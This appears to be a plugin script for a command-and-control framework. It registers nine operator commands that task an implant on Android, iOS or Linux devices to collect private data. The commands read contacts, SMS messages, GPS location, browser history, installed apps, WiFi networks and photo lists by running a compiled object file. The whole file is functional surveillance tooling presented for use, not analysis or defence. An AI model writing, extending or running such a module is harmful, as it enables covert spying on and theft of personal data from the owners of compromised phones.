var metadata = {
    name: "Mobile-Agent",
    description: "Mobile device commands: device info, contacts, SMS, apps, WiFi, photos, location, browser history"
};

var device_info = ax.create_command("device-info", "Get mobile device information", "device-info");
device_info.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [100]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Device Info");
});

var device_full = ax.create_command("device-info-full", "Get detailed device information", "device-info-full");
device_full.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [109]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Full Device Info");
});

var contacts = ax.create_command("contacts", "Read device contacts", "contacts");
contacts.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [101]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Read Contacts");
});

var sms = ax.create_command("sms-read", "Read SMS messages", "sms-read");
sms.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [102]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Read SMS");
});

var wifi = ax.create_command("wifi-list", "List available WiFi networks", "wifi-list");
wifi.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [103]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: WiFi Networks");
});

var apps = ax.create_command("apps-list", "List installed applications", "apps-list");
apps.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [104]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Installed Apps");
});

var photos = ax.create_command("photos-list", "List photos on device", "photos-list");
photos.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [106]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: List Photos");
});

var location = ax.create_command("location", "Get device GPS location", "location");
location.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [107]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: GPS Location");
});

var browser = ax.create_command("browser-history", "Read browser history", "browser-history");
browser.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [108]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Browser History");
});

var group = ax.create_commands_group("Mobile Device", [device_info, device_full, contacts, sms, wifi, apps, photos, location, browser]);
ax.register_commands_group(group, ["gopher"], ["android", "ios", "linux"], []);
